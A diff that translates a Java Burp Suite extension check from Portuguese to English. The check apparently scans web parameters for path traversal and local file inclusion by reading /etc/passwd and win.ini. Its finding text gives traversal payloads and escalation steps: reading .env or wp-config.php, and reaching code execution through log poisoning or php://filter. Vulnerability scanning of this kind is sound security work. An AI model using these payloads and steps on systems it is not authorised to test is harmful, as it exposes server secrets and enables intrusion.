@@ -12,12 +12,12 @@ import java.util.List;
 import java.util.regex.Pattern;
 
 /**
- * Testa parâmetros que costumam servir arquivos (file, path, page, template,
- * document...) com payloads clássicos de Path Traversal / Local File
- * Inclusion, procurando pela assinatura de /etc/passwd (Linux) ou win.ini
- * (Windows) refletida na resposta.
+ * Tests parameters that typically serve files (file, path, page, template,
+ * document...) with classic Path Traversal / Local File Inclusion payloads,
+ * looking for the signature of /etc/passwd (Linux) or win.ini (Windows)
+ * reflected in the response.
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class PathTraversalCheck implements VulnCheck {
 
@@ -35,23 +35,23 @@ public class PathTraversalCheck implements VulnCheck {
             "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
     };
 
-    private static final Pattern ASSINATURA_PASSWD = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
-    private static final Pattern ASSINATURA_WININI = Pattern.compile("\\[extensions\\]|\\[fonts\\]", Pattern.CASE_INSENSITIVE);
+    private static final Pattern PASSWD_SIGNATURE = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
+    private static final Pattern WININI_SIGNATURE = Pattern.compile("\\[extensions\\]|\\[fonts\\]", Pattern.CASE_INSENSITIVE);
 
     @Override
-    public String nome() {
+    public String name() {
         return "Path Traversal / Local File Inclusion";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
         for (String param : PARAM_NAMES) {
             for (String payload : PAYLOADS) {
                 try {
-                    String url = base + "/?" + param + "=" + payload; // sem URL-encode total: alguns servidores só normalizam decodificado
+                    String url = base + "/?" + param + "=" + payload; // not fully URL-encoded: some servers only normalize the decoded form
                     HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                     HttpResponse resp = api.http().sendRequest(req).response();
                     if (resp == null) continue;
@@ -59,32 +59,32 @@ public class PathTraversalCheck implements VulnCheck {
                     String body = resp.bodyToString();
                     if (body == null) continue;
 
-                    boolean achouPasswd = ASSINATURA_PASSWD.matcher(body).find();
-                    boolean achouWinIni = ASSINATURA_WININI.matcher(body).find();
+                    boolean foundPasswd = PASSWD_SIGNATURE.matcher(body).find();
+                    boolean foundWinIni = WININI_SIGNATURE.matcher(body).find();
 
-                    if (achouPasswd || achouWinIni) {
-                        achados.add(new Finding(
-                                "Possível Path Traversal / LFI no parâmetro '" + param + "'",
-                                Severity.CRITICA,
+                    if (foundPasswd || foundWinIni) {
+                        findings.add(new Finding(
+                                "Possible Path Traversal / LFI in parameter '" + param + "'",
+                                Severity.CRITICAL,
                                 url,
-                                "O envio de um payload de travessia de diretório resultou em conteúdo de arquivo de sistema " +
-                                        "(" + (achouPasswd ? "/etc/passwd" : "win.ini") + ") refletido na resposta — o parâmetro permite " +
-                                        "leitura arbitrária de arquivos do servidor.",
+                                "Sending a directory traversal payload resulted in system file content " +
+                                        "(" + (foundPasswd ? "/etc/passwd" : "win.ini") + ") reflected in the response — the parameter allows " +
+                                        "arbitrary file reads on the server.",
                                 "Payload: " + payload,
-                                "Nunca monte caminhos de arquivo a partir de entrada do usuário. Use um mapa fixo de IDs para arquivos " +
-                                        "permitidos (allowlist) e normalize/valide o caminho resultante antes de qualquer acesso ao filesystem.",
-                                "1) No Repeater, reenvie trocando o alvo por arquivos de config da aplicação (ex: ../../../etc/app/config.yml, " +
-                                        "web.xml, .env, wp-config.php — ajuste a quantidade de ../ conforme a profundidade real do servidor). " +
-                                        "2) Se a aplicação for PHP e você suspeitar de LFI real (não só leitura), tente escalar pra RCE via " +
-                                        "log poisoning (ler access.log do Apache/Nginx após injetar PHP no User-Agent) ou via php://filter " +
-                                        "para ler código-fonte em base64. 3) Documente todos os arquivos sensíveis acessíveis."));
-                        break; // já confirmado nesse param, não precisa testar os outros payloads
+                                "Never build file paths from user input. Use a fixed ID-to-file map for the allowed files " +
+                                        "(allowlist) and normalize/validate the resulting path before any filesystem access.",
+                                "1) In Repeater, resend swapping the target for the application's config files (e.g. ../../../etc/app/config.yml, " +
+                                        "web.xml, .env, wp-config.php — adjust the number of ../ to the server's actual depth). " +
+                                        "2) If the application is PHP and you suspect real LFI (not just a read), try escalating to RCE via " +
+                                        "log poisoning (reading the Apache/Nginx access.log after injecting PHP into the User-Agent) or via php://filter " +
+                                        "to read source code in base64. 3) Document every sensitive file that is reachable."));
+                        break; // already confirmed on this param, no need to test the other payloads
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro no check de Path Traversal (param " + param + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error in Path Traversal check (param " + param + "): " + e.getMessage());
                 }
             }
         }
-        return achados;
+        return findings;
     }
 }
